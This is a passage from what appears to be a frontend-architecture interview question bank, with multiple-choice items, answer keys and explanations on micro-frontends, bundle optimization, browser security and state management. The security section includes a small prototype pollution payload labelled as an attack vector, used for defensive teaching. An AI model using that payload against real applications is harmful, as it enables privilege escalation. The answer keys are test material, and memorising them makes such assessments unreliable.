- D) The shell team writes all tests — MFE teams focus on feature development

**Answer: B) Unit tests per MFE, contract tests for interfaces (Pact), and E2E integration tests in the shell**

**Explanation:** Three-layer testing: 1) **Unit/component tests** — each MFE tested in isolation with mocked shell APIs. 2) **Contract tests** (Pact) — verifies that the shell\'s consumption of MFE APIs (custom events, props) matches the MFE\'s actual implementation, without requiring both deployed. 3) **E2E integration** — Playwright/Cypress tests running against the fully assembled shell verify complete user journeys across MFE boundaries. Contract tests are the key innovation — they catch integration regressions without full E2E setup.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does a Technical Architect ensure a micro-frontend system remains deployable as teams grow?

- A) Require all MFEs to deploy simultaneously to avoid version mismatches
- B) Enforce independent deployability: each MFE has its own CI/CD pipeline, maintains backwards-compatible interfaces, and uses versioned remote entry URLs — the shell works with any compatible MFE version
- C) Use a single monorepo with one deployment pipeline for all MFEs
- D) MFEs should all share the same version number and release cycle

**Answer: B) Independent CI/CD per MFE, backwards-compatible interfaces, and versioned remote entry URLs**

**Explanation:** Independent deployability is the core value of MFE architecture. Requirements: 1) Each MFE has its own CI/CD (builds, tests, deploys without coordination). 2) Interface contracts are backwards-compatible — if an MFE adds a new custom event, old consumers still work. 3) The shell uses URL patterns with version pinning or floating (`latest` tag) based on stability needs. 4) Feature flags allow new MFE versions to be deployed without activating for users. 5) Blue-green or canary deployments per MFE for zero-downtime updates.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 34. Bundle & Runtime Optimization

<br>

## Q. A Technical Architect is analyzing a production bundle and finds a single 2MB JavaScript file. Which combination of strategies produces the greatest impact on initial load performance?

- A) Minification and gzip compression only — code-splitting adds complexity with minimal gain
- B) Code-splitting with dynamic `import()` at route boundaries, lazy loading non-critical components, and tree-shaking unused exports
- C) Moving all JavaScript to a CDN and using `defer` on all script tags
- D) Converting all arrow functions to regular functions to reduce parse time

**Answer: B) Code-splitting with dynamic `import()` at route boundaries, lazy loading non-critical components, and tree-shaking unused exports**

**Explanation:** A 2MB initial bundle critically delays Time to Interactive (TTI). Route-level code-splitting via `import()` lets users download only what they need for the current view. Tree-shaking removes dead code at build time. Lazy loading defers heavy components (charts, editors) until needed. Together, these can reduce initial payload by 60–80%. CDN + `defer` helps delivery but doesn\'t reduce the amount of code parsed and executed.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Technical Architect needs to offload a computationally intensive image-processing task from the main thread. The task takes ~2 seconds per image and blocks UI interaction. What is the correct architectural solution?

```javascript
// Current — blocks the UI for 2 seconds
button.addEventListener("click", () => {
  const result = processImage(imageData); // ~2000ms
  displayResult(result);
});
```

- A) Wrap `processImage` in `requestAnimationFrame` to spread work across frames
- B) Use `setTimeout(processImage, 0)` to defer execution until after the click event
- C) Move `processImage` to a Web Worker; communicate via `postMessage` and `onmessage`
- D) Use `async/await` to make `processImage` non-blocking

**Answer: C) Move `processImage` to a Web Worker; communicate via `postMessage` and `onmessage`**

**Explanation:** JavaScript is single-threaded — `requestAnimationFrame`, `setTimeout`, and `async/await` only defer execution within the same thread; a 2-second synchronous computation will still freeze the UI. Web Workers run in a separate thread with their own event loop. The main thread sends data via `postMessage`, the Worker processes it and posts back the result, and the main thread updates the UI — all without any UI freeze. For Transferable objects (e.g., `ArrayBuffer`), use zero-copy transfer for maximum performance.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the architectural difference between Webpack and Rollup, and when should each be used?

- A) Webpack and Rollup are identical — choose based on personal preference
- B) Rollup excels at library bundling (smaller output, better tree-shaking, clean ESM output); Webpack excels at application bundling (code-splitting, HMR, complex loaders, dynamic imports, asset handling)
- C) Rollup is faster than Webpack in all scenarios
- D) Webpack should always be replaced with Rollup for better performance

**Answer: B) Rollup for libraries (ESM, tree-shaking); Webpack for applications (code-splitting, HMR, complex asset pipeline)**

**Explanation:** Rollup uses static analysis for dead code elimination and outputs clean ESM that downstream consumers can tree-shake. Ideal for: utility libraries, component libraries, design systems. Webpack\'s rich plugin ecosystem handles: HMR for development, complex loaders (CSS, images, fonts), dynamic import splitting, Module Federation. Vite (esbuild for dev, Rollup for prod) has become the standard for new projects combining fast development with optimized production builds.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the impact of source maps on production performance and security?

- A) Source maps should always be included in production for best debugging
- B) Source maps expose original source code — use server-side-only source maps (uploaded to error monitoring, not served publicly); never ship `.map` files to the browser in production
- C) Source maps have no performance impact — they are only downloaded when DevTools is open
- D) Disable source maps entirely even in development

**Answer: B) Expose original source; use server-side-only source maps uploaded to error monitoring tools**

**Explanation:** Source maps trade-off: debugging benefit vs. IP exposure and file size. Options: `hidden-source-map` in webpack — generates `.map` files but removes the `//# sourceMappingURL` comment (preventing browsers from loading them). Upload to Sentry/Datadog as a build step. Stack traces in error monitoring show original source lines while the browser never receives the map. `eval-cheap-module-source-map` for development (fast rebuild). Never use `source-map` mode in production with public-facing `.map` files.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect configure HTTP/2 server push vs. `<link rel="preload">` for critical resources?

- A) Always use HTTP/2 push — it\'s always faster than any client-side approach
- B) `<link rel="preload">` is generally preferred — it avoids HTTP/2 push pitfalls (pushing uncached resources, wasted bandwidth), works across HTTP/1.1 and HTTP/2, and gives the browser control over priority
- C) HTTP/2 server push and `<link rel="preload">` achieve identical results
- D) Only use `defer` — preloading resources creates network contention

**Answer: B) `<link rel="preload">` preferred — avoids push pitfalls, works across HTTP versions, browser controls priority**

**Explanation:** HTTP/2 push problems: the server doesn\'t know the browser\'s cache state — it may push resources the browser already has (wasted bandwidth). Chrome has deprecated HTTP/2 push due to these issues. `<link rel="preload">` is better: the browser checks its cache first, only fetches if missing, and integrates with priority hints. For critical fonts and CSS: `<link rel="preload" as="font">`, `<link rel="preload" as="style">`. For likely-next page resources: `<link rel="prefetch">`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct Brotli vs gzip compression strategy for production deployments?

- A) gzip is always sufficient — Brotli provides minimal gains
- B) Brotli achieves 15-25% better compression than gzip for text assets; serve Brotli (`br`) to compatible browsers and gzip as fallback; compress at build time rather than on-the-fly
- C) Brotli should not be used in production — it\'s too slow to decompress
- D) Compression should only be applied to files larger than 10MB

**Answer: B) Brotli is 15-25% better; serve to compatible browsers with gzip fallback; compress at build time**

**Explanation:** Brotli (Google, 2015) consistently outperforms gzip on JS/CSS/HTML compression (15-25% smaller). Build-time strategy: `webpack-compression-plugin` generates both `file.js.br` and `file.js.gz` at build time (not per-request, which is expensive). Nginx/Caddy serves `Content-Encoding: br` if the browser sends `Accept-Encoding: br` (all modern browsers do), falls back to gzip otherwise. Compression level: Brotli 11 for build-time (slow but maximum compression); gzip 9.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What caching strategy should be applied to different types of assets in a CDN?

- A) Apply the same cache TTL to all assets for simplicity
- B) Content-hashed assets (JS/CSS bundles) get `Cache-Control: max-age=31536000, immutable`; index.html gets `Cache-Control: no-cache`; API responses get short TTL or `no-store`
- C) Never cache JavaScript files — they change too frequently
- D) Cache all responses for 24 hours and rely on CDN purging for updates

**Answer: B) Content-hashed bundles get 1-year immutable cache; index.html gets no-cache; API gets short/no-store**

**Explanation:** Tiered caching strategy: 1) **`bundle.a1b2c3d4.js`** — content hash in filename means if content changes, filename changes. Cache forever: `Cache-Control: max-age=31536000, immutable`. 2) **`index.html`** — `no-cache` forces browser to check for updates on every navigation (enabling cache busting for new bundle filenames). 3) **API responses** — TTL based on data freshness requirements. 4) **Images** — long TTL with versioned URLs for updates. This maximizes caching without staleness risk.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect approach JavaScript parse time optimization?

- A) Parse time only affects mobile devices — desktop is fast enough
- B) Reduce the amount of JavaScript that needs parsing: code-split and lazy load, remove unused dependencies, prefer native browser APIs over polyfills, and use `modulepreload` for critical modules
- C) Parse time is fixed — it cannot be optimized without changing hardware
- D) Increase JavaScript parse time is only affected by minification

**Answer: B) Reduce JS to parse: code-split, remove unused dependencies, prefer native APIs, modulepreload critical modules**

**Explanation:** JavaScript parse and compile time is a significant cost, especially on low-end mobile. V8\'s bytecode cache helps on repeat visits, but first load is cold. Strategies: 1) **Less JS** — the best optimization. Every dependency added has a parse cost. 2) **Lazy load** — split by route so only the critical path parses on load. 3) **`<link rel="modulepreload">`** — starts downloading and parsing ES modules before they're imported. 4) **Avoid re-implementing native APIs** — `Array.flat()`, `Object.fromEntries()` are zero parse overhead. 5) Profile with Chrome DevTools "Coverage" tab to find unused JS.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the runtime performance impact of JavaScript memory management?

- A) Memory management is automatic in JavaScript — developers cannot affect it
- B) Frequent allocation of short-lived objects causes GC pauses; object pooling, typed arrays for numeric data, and avoiding closures that retain large scopes reduce GC pressure
- C) GC only runs when the tab is idle — it never causes visible jank
- D) Increasing heap size via Chrome flags is the only solution for GC pauses

**Answer: B) Frequent short-lived allocations cause GC pauses; object pooling, typed arrays, and scope discipline reduce pressure**

**Explanation:** GC pauses can cause frame drops. High-GC scenarios: animation loops that create new objects every frame; frequent JSON parsing/stringification; array methods that create intermediate arrays (`filter().map().reduce()`). Mitigations: 1) **Object pool** — reuse objects (game engines, canvas animations). 2) **`Float32Array`/`Int32Array`** — typed arrays have no per-element boxing overhead, GC doesn\'t scan them. 3) **Avoid capturing large objects in closures**. 4) Use Chrome Memory Profiler to detect allocation hotspots and leaked detached DOM nodes.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect set up performance budgets in the CI/CD pipeline?

- A) Performance budgets should be set manually after each release
- B) Define budgets in `webpack.config.js` (`performance.maxAssetSize`) and `size-limit` config; fail CI builds that exceed thresholds; track bundle size trends in pull requests with automated comments
- C) Performance budgets are only applicable for initial app setup
- D) Budgets should only apply to production builds, not feature branches

**Answer: B) webpack performance config + size-limit; fail CI on threshold breach; track trends in PRs**

**Explanation:** Automated prevention of performance regressions: 1) **webpack** `performance: { maxEntrypointSize: 250000, maxAssetSize: 250000, hints: 'error' }` — fails build on exceeded budget. 2) **`size-limit`** (npm package) — measures compressed JS size after tree-shaking; add to CI. 3) **Bundlewatch** — comments on PRs with "Bundle size increased by 5KB (was 245KB, now 250KB)". 4) **Lighthouse CI** — measure Core Web Vitals in CI against reference URLs. Catching regressions in PRs is far cheaper than finding them in production.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct approach to optimizing React hydration in a server-side rendered application?

- A) Hydration performance cannot be optimized — it\'s a fixed cost of SSR
- B) Reduce hydration cost with selective hydration (React 18 `startTransition`), lazy hydration for below-fold content, and partial hydration (islands architecture) for mostly-static pages
- C) Disable hydration and use client-side rendering for all pages
- D) Increase Node.js server memory to speed up hydration

**Answer: B) Selective hydration, lazy hydration for below-fold content, and partial hydration (islands)**

**Explanation:** Hydration — attaching React event listeners to server-rendered HTML — is expensive for large component trees. React 18 improvements: 1) **Streaming SSR** with `renderToPipeableStream` — HTML streams incrementally, hydration starts earlier. 2) **Selective hydration** — React prioritizes hydrating components the user interacts with first. 3) **`startTransition` wrapping non-critical hydration** — keeps the app responsive during heavy hydration. 4) **Islands architecture** (Astro/Fresh) — only hydrate interactive components; static content has zero JS.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 35. Security Architecture

<br>

## Q. A Technical Architect is implementing a Content Security Policy (CSP) for a financial application. Which CSP header configuration best prevents XSS while allowing the app to function?

- A) `Content-Security-Policy: default-src *` — allows everything and prevents CSP-related breakage
- B) `Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval'` — explicitly allows inline scripts for flexibility
- C) `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none'` — restricts scripts to same origin and a trusted CDN
- D) `Content-Security-Policy: default-src 'none'` — blocks everything including same-origin resources

**Answer: C) `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none'` — restricts scripts to same origin and a trusted CDN**

**Explanation:** `default-src *` renders CSP useless. `'unsafe-inline'` and `'unsafe-eval'` defeat the primary XSS protection. `default-src 'none'` breaks the application. The correct approach is a strict allowlist: only permit scripts from `'self'` and explicitly trusted CDNs. Use nonces (`'nonce-abc123'`) or hashes for any inline scripts that cannot be externalized. `object-src 'none'` prevents Flash/plugin-based attacks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Technical Architect is reviewing the security posture of a third-party npm package integration. Which attack vector does the following `package.json` configuration help mitigate?

```json
{
  "dependencies": {
    "popular-library": "^2.3.0"
  }
}
```

```bash
# CI pipeline addition
npm ci --audit
```

- A) Prototype pollution attacks from malicious payloads in API responses
- B) Supply chain attacks via malicious package versions published after the initial install (using `npm audit` and lock files with `npm ci`)
- C) XSS attacks injected through npm scripts during build
- D) CSRF attacks originating from the library\'s bundled HTTP client

**Answer: B) Supply chain attacks via malicious package versions published after the initial install (using `npm audit` and lock files with `npm ci`)**

**Explanation:** `^2.3.0` allows automatic minor/patch updates, which can introduce a compromised version (supply chain attack). `npm ci` installs exact versions from `package-lock.json`, preventing silent upgrades. `--audit` checks against the npm advisory database for known vulnerabilities. An architect should also consider pinning exact versions in production, using Subresource Integrity (SRI) for CDN scripts, and evaluating tools like Socket.dev or Snyk for continuous supply chain monitoring.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct OAuth 2.0 / OIDC flow for a single-page application (SPA)?

- A) Use the Implicit flow — it\'s designed specifically for SPAs
- B) Use the Authorization Code flow with PKCE (Proof Key for Code Exchange) — the Implicit flow has been deprecated due to token exposure in URL fragments
- C) Store the client secret in the SPA and use client credentials flow
- D) Use the Resource Owner Password Credentials flow for the best user experience

**Answer: B) Authorization Code flow with PKCE — Implicit flow is deprecated due to token exposure in URL fragments**

**Explanation:** The Implicit flow returned tokens in URL fragments (visible in browser history, server logs, referrer headers). PKCE replaces it: 1) SPA generates a random `code_verifier` and hashes it as `code_challenge`. 2) Authorization request includes `code_challenge`. 3) Authorization server returns an authorization code (not a token). 4) SPA exchanges code + `code_verifier` for tokens — only works for the original SPA (no client secret needed). Tokens stay out of URLs and are returned via the back channel. `react-oidc-context` and `auth0-spa-js` implement PKCE.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct strategy for JWT token storage in a browser?

- A) Store JWT in `localStorage` — it\'s the simplest approach
- B) Store JWT in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie — `localStorage` and `sessionStorage` are accessible via JavaScript and vulnerable to XSS theft
- C) Store JWT in memory (JavaScript variable) with a refresh token in HttpOnly cookie — balances XSS protection with cross-tab session sharing limitations
- D) Both B and C are valid strategies with different trade-offs depending on the security requirements

**Answer: D) Both B (HttpOnly cookie) and C (memory + HttpOnly refresh token) are valid — depends on security requirements**

**Explanation:** `localStorage` JWT storage = XSS vulnerability; a single XSS attack exfiltrates tokens permanently. **Option B** (HttpOnly cookie): CSRF risk, mitigated by `SameSite=Strict`; works across tabs; simplest implementation. **Option C** (memory + refresh token in HttpOnly cookie): Access token in JS memory means XSS can only steal it during the session (not persist to localStorage); survives page reload via silent refresh. Financial applications often use Option C with short access token lifetimes (15 min) and long refresh token rotation.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect implement defense against prototype pollution at the architecture level?

```javascript
// Attack vector
const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign({}, userInput); // Pollutes Object.prototype
```

- A) Prototype pollution is only a theoretical vulnerability — not worth addressing
- B) Use `Object.create(null)` for objects used as maps, validate/sanitize all JSON before processing, use `Object.freeze(Object.prototype)` in security-critical apps, and prefer `Map` over object literals for dynamic key-value storage
- C) JSON.parse automatically strips `__proto__` keys
- D) Using TypeScript prevents all prototype pollution attacks

**Answer: B) `Object.create(null)` for maps, sanitize JSON input, `Object.freeze(Object.prototype)`, prefer `Map`**

**Explanation:** Prototype pollution can escalate privileges (setting `isAdmin: true` on `Object.prototype` affects all objects). Defense layers: 1) **Input sanitization** — strip `__proto__`, `constructor`, `prototype` keys from user input (libraries: `deep-object-diff`, `sanitize` options in `merge`). 2) **`Object.create(null)`** — creates an object with no prototype chain (not vulnerable). 3) **`Map`** — completely separate from `Object.prototype`. 4) **`Object.freeze(Object.prototype)`** — prevents modification (may break some libraries). 5) **npm packages** like `flat`, `lodash` have patched this — keep dependencies updated.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct security posture for handling third-party iframes?

- A) Allow all iframes — they're sandboxed by the browser automatically
- B) Use `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` for your own pages; add the `sandbox` attribute to any third-party iframes you embed
- C) `sandbox` attribute on iframes disables all security restrictions
- D) Third-party iframes cannot access your page\'s data

**Answer: B) `X-Frame-Options: DENY` for your page; `sandbox` attribute with minimal permissions on iframes you embed**

**Explanation:** Two distinct problems: 1) **Clickjacking** — attackers embed your page in their iframe and trick users into clicking. Defense: `X-Frame-Options: DENY` or `CSP: frame-ancestors 'none'` prevents your pages from being iframed. 2) **Third-party iframes you embed** — chat widgets, payment forms, etc. Use `<iframe sandbox="allow-scripts allow-forms">`. The `sandbox` attribute removes capabilities by default; you explicitly grant only what\'s needed. Also: `allow-same-origin` re-grants same-origin access (defeats sandbox if combined with `allow-scripts`).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the architect\'s approach to secrets management in a JavaScript application?

- A) Store API keys in `process.env` — environment variables are fully secure
- B) Server-side secrets never reach the browser; browser applications use short-lived tokens from a backend; build-time environment variables embedded in bundles are public — treat them as public configuration, never secrets
- C) Prefix environment variables with `REACT_APP_` to make them secure
- D) Base64 encoding secrets in environment variables provides adequate security

**Answer: B) Server-side secrets never reach the browser; browser env vars are public — use short-lived backend-issued tokens**

**Explanation:** Any value in a JS bundle sent to the browser is public — webpack, Vite, Next.js all embed `process.env.REACT_APP_*` or `VITE_*` variables into the bundle. An attacker opens DevTools and reads them. Architecture: 1) **Server secrets** (DB passwords, service API keys) stay server-side only. 2) **Browser tokens** are short-lived, revocable, user-scoped tokens issued by your backend after authentication. 3) **Public config** (analytics IDs, CDN URLs) can be in browser env vars. 4) Use a secrets manager (AWS Secrets Manager, Vault) for server-side secrets rotation.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What security headers should a Technical Architect require on all production HTTP responses?

- A) Only `X-XSS-Protection` is needed — it enables the browser\'s built-in XSS filter
- B) `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Strict-Transport-Security`, `Referrer-Policy`, and `Permissions-Policy`
- C) Security headers only need to be applied to authenticated routes
- D) The browser handles security automatically — headers are optional

**Answer: B) CSP, X-Content-Type-Options, X-Frame-Options, HSTS, Referrer-Policy, and Permissions-Policy**

**Explanation:** Security header checklist: 1) **HSTS** (`Strict-Transport-Security: max-age=31536000; includeSubDomains`) — forces HTTPS. 2) **CSP** — prevents XSS (see earlier question). 3) **X-Content-Type-Options: nosniff** — prevents MIME sniffing attacks. 4) **X-Frame-Options: DENY** — prevents clickjacking. 5) **Referrer-Policy: strict-origin-when-cross-origin** — controls what\'s in `Referer` headers. 6) **Permissions-Policy** — disables browser features not needed (`camera=(), microphone=(), geolocation=()`). Use [securityheaders.com](https://securityheaders.com) to audit. `X-XSS-Protection` is deprecated — CSP replaces it.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect approach dependency vulnerability management?

- A) Run `npm audit fix` quarterly — this is sufficient for most applications
- B) Automate vulnerability scanning in CI (npm audit, Snyk, socket.dev); configure Dependabot or Renovate for automated PR-based dependency updates; establish a patch SLA (critical: 24h, high: 7 days)
- C) Only update dependencies when the team has capacity for manual testing
- D) Avoid all third-party dependencies to eliminate vulnerability risk

**Answer: B) CI scanning, Dependabot/Renovate automation, and SLA-based patching (critical: 24h, high: 7 days)**

**Explanation:** Proactive security posture: 1) **CI gate** — `npm audit --audit-level=high` fails the build for high/critical CVEs. 2) **Dependabot/Renovate** — auto-PRs for security patches; auto-merge for patch updates (low risk). 3) **Snyk** or **Socket.dev** — deeper analysis including transitive dependencies and malicious packages. 4) **Patch SLA** — critical CVEs (CVSS 9+): patch within 24 hours; high (7+): 7 days; medium: next sprint. 5) **SBOM** (Software Bill of Materials) — maintain a list of all dependencies for compliance and incident response.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the security implication of `eval()`, `Function()`, and `setTimeout('string')`?

- A) These are standard patterns — the browser sandboxes them automatically
- B) All three execute arbitrary JavaScript strings — if the string includes user input, they create code injection vulnerabilities; they also defeat CSP `script-src` protections
- C) Only `eval()` is dangerous — `Function()` and string-based `setTimeout` are safe
- D) These only affect performance, not security

**Answer: B) All three execute arbitrary strings — user input creates code injection; they defeat CSP `script-src`**

**Explanation:** Code injection: `eval(userInput)` executes whatever the attacker provides. Equivalent risks: `new Function(userInput)()`, `setTimeout("alert(1)", 0)`, `setInterval("maliciousCode()", 1000)`. CSP `script-src 'self'` is bypassed because these execute inline dynamically. Secure alternatives: `setTimeout(callbackFn, 0)` (never string), JSON.parse for data parsing, data attributes for DOM communication. If a template engine uses `eval` under the hood (Handlebars, EJS misuse), ensure user data is never rendered as template syntax.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is a Technical Architect\'s strategy for zero-trust security in a frontend application?

- A) Zero-trust only applies to backend systems and network infrastructure
- B) Assume the client is always compromised: all authorization is server-enforced; never trust client-side validation alone; sensitive business logic runs server-side; API tokens have minimum required permissions (principle of least privilege)
- C) Zero-trust means requiring the user to log in every request
- D) Zero-trust is achieved by adding more authentication factors

**Answer: B) Assume client is compromised: server-enforced authorization, no client-only validation, least-privilege tokens**

**Explanation:** Client-side code (JavaScript) can be modified by any user. Zero-trust frontend principles: 1) **Never enforce authorization on the client alone** — hiding a button is UI polish, not security. The API must reject unauthorized requests. 2) **Least-privilege tokens** — API tokens scoped to only what\'s needed (read-only for read operations). 3) **Re-validate on every request** — don\'t cache authorization decisions client-side. 4) **Sensitive computations server-side** — prices, discounts, stock levels calculated server-side. 5) **Input validation** on client = UX improvement; on server = security requirement.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 36. State Management at Scale

<br>

## Q. A Technical Architect is evaluating state management for a large React application with 30+ developers across 6 teams. The app has complex server state (API data), client UI state (modals, filters), and cross-team shared state (user session). Which architecture is most scalable?

- A) A single global Redux store for all state — one source of truth simplifies debugging
- B) Separate concerns: React Query / TanStack Query for server state, Zustand/Jotai for local UI state, and a shared session store for cross-team auth state
- C) Context API for everything — it\'s built-in and requires no extra dependencies
- D) Each team maintains its own independent Redux store with no cross-team state sharing

**Answer: B) Separate concerns: React Query / TanStack Query for server state, Zustand/Jotai for local UI state, and a shared session store for cross-team auth state**

**Explanation:** Mixing server-cache state (loading, error, staleness, refetching) with client UI state in a single Redux store creates enormous boilerplate and caching complexity. TanStack Query handles async server state with built-in caching, deduplication, and background refreshing. Lightweight atomic stores (Zustand/Jotai) manage UI-only state without Redux overhead. A shared session store handles the few truly global concerns. This separation of concerns scales with team growth and reduces inter-team coupling.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Technical Architect notices that multiple micro-frontends read from and write to the same `localStorage` keys for shared state, causing race conditions. What is the architectural solution?

```javascript
// MFE-A writes
localStorage.setItem("cart", JSON.stringify(cartItems));

// MFE-B reads concurrently (stale or overwritten data)
const cart = JSON.parse(localStorage.getItem("cart"));
```

- A) Use `sessionStorage` instead — it has atomic write semantics
- B) Implement a shared state bus using `BroadcastChannel` API or a shared event bus in the shell, making the shell the single owner of shared state
- C) Use `IndexedDB` with transactions — it supports concurrent access with row-level locking
- D) Add a `setTimeout(50)` delay before each read to avoid race conditions

**Answer: B) Implement a shared state bus using `BroadcastChannel` API or a shared event bus in the shell, making the shell the single owner of shared state**

**Explanation:** `localStorage` has no locking mechanism — concurrent writes from multiple tabs/frames create race conditions. The architectural fix is to designate the shell as the single source of truth for shared state, with micro-frontends communicating via a `CustomEvent` bus or `BroadcastChannel` (for cross-tab sync). Each micro-frontend dispatches actions; the shell updates the store and broadcasts changes. `IndexedDB` transactions prevent corruption but don\'t solve the cross-MFE ownership problem.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct approach to cache invalidation in TanStack Query for a complex application?

- A) Use `refetchOnWindowFocus: false` to disable all automatic refetching
- B) Organize queries with hierarchical query keys (`['users', userId, 'orders']`); use `queryClient.invalidateQueries({ queryKey: ['users'] })` to invalidate all user-related queries after mutations; use optimistic updates for immediate UI feedback
- C) Always set `staleTime: Infinity` to prevent any automatic refetching
- D) Manually call `refetch()` on every query after every mutation

**Answer: B) Hierarchical query keys + `invalidateQueries` for cascading invalidation + optimistic updates**

**Explanation:** TanStack Query cache key hierarchy: `['users']` is a parent of `['users', userId]` and `['users', userId, 'orders']`. After a user mutation, `invalidateQueries(['users'])` automatically invalidates all user-related cached data. Optimistic update pattern: 1) Update cache immediately on mutation. 2) Rollback on error. 3) Invalidate/refetch to confirm server state. `staleTime` controls how long data is considered fresh (avoid refetching): 0 (always stale) to `Infinity` (manual only).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect design state normalization for deeply nested API data?

- A) Store deeply nested objects as-is in the state — it\'s simpler
- B) Normalize nested data into flat lookup maps (entity dictionaries by ID); UI components derive views from normalized data using selectors; this prevents duplication and simplifies updates
- C) Denormalize everything for faster read access — write complexity is acceptable
- D) Deeply nested state requires custom merge strategies and cannot be normalized

**Answer: B) Normalize into flat entity maps by ID; selectors derive views; prevents duplication and simplifies updates**

**Explanation:** Problem with nesting: `{ users: [{ id: 1, orders: [{ id: 10, items: [...] }] }] }` — updating order #10 requires finding it in the nested tree. Normalized state: `{ users: { 1: { id: 1, orderIds: [10] } }, orders: { 10: { id: 10, itemIds: [100] } }, items: { 100: {...} } }`. Updating order #10 is `state.orders[10] = newOrder`. Libraries: `normalizr`, Redux Toolkit\'s `createEntityAdapter` (built-in normalization with CRUD selectors). Selectors combine entity maps into the view needed by components.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the architect\'s approach to real-time state synchronization (WebSocket updates)?

- A) Re-fetch all data from the API whenever a WebSocket message arrives
- B) WebSocket messages trigger targeted cache updates or Redux actions — update only the affected entity in the store; components automatically reflect the change via selectors
- C) Store all WebSocket messages in a separate array and let components poll it
- D) Disable client-side caching entirely when using WebSockets

**Answer: B) WebSocket messages trigger targeted store updates on the affected entity; components react via selectors**

**Explanation:** Efficient real-time sync: 1) WebSocket message: `{ type: 'ORDER_UPDATED', payload: { id: 10, status: 'shipped' } }`. 2) Dispatch to store/cache: `queryClient.setQueryData(['orders', 10], old => ({ ...old, status: 'shipped' }))` or Redux `dispatch(ordersSlice.actions.orderUpdated(payload))`. 3) Components using that query/selector re-render automatically. Avoid full refetch on every WS message — it creates unnecessary API load. Handle reconnection: on reconnect, invalidate potentially-stale queries to catch any missed messages.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does a Technical Architect implement XState (state machines) for complex UI flows?

```javascript
const checkoutMachine = createMachine({
  id: 'checkout',
  initial: 'cart',
  states: {
    cart: { on: { PROCEED: 'shipping' } },
    shipping: { on: { BACK: 'cart', PROCEED: 'payment' } },
    payment: { on: { BACK: 'shipping', SUBMIT: 'processing' } },
    processing: { on: { SUCCESS: 'complete', FAILURE: 'paymentError' } },
    paymentError: { on: { RETRY: 'payment' } },
    complete: { type: 'final' }
  }
});
```

- A) State machines add unnecessary complexity — React\'s `useState` is sufficient
- B) State machines make impossible states impossible — multi-step flows (checkout, onboarding wizards, form submissions) benefit from explicit state modeling that prevents invalid transitions
- C) XState only works with Redux — it requires a global store
- D) State machines cannot model async operations

**Answer: B) State machines make impossible states impossible — explicit modeling prevents invalid transitions in complex flows**

**Explanation:** Problem with ad-hoc state: `const [isLoading, setLoading] = useState(false)` + `const [hasError, setHasError] = useState(false)` — what does `isLoading: true, hasError: true` mean? Impossible states become possible. State machines: only one state at a time; invalid transitions are ignored (can\'t go from `complete` back to `cart`). Benefits: visualizable (XState visualizer), testable (deterministic), self-documenting. Ideal for: checkout flows, multi-step forms, auth flows, media players, complex UI interactions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the technical architect\'s approach to persisting state across page reloads?

- A) Re-fetch everything from the server on each page load — the only reliable approach
- B) Persist carefully selected state slices to localStorage/IndexedDB using serialization; restore on app init; avoid persisting sensitive data or derived state; handle stale persisted state with version migrations
- C) Persist the entire Redux store — completeness over selectivity
- D) `sessionStorage` is the best option for all persisted state

**Answer: B) Persist selected slices; restore on init; skip sensitive/derived state; migrate stale versions**

**Explanation:** `redux-persist` / Zustand persist middleware: selectively persist (whitelist/blacklist specific slices). What to persist: user preferences (theme, locale), partially filled form drafts, session-agnostic UI config. What NOT to persist: auth tokens in `localStorage` (XSS risk; use HttpOnly cookies), loading/error states (always false on fresh load), cached server data (refetch on init — may be stale). Version migrations: if the persisted state shape changes between releases, a `migrations` map transforms old format → new format on restore.
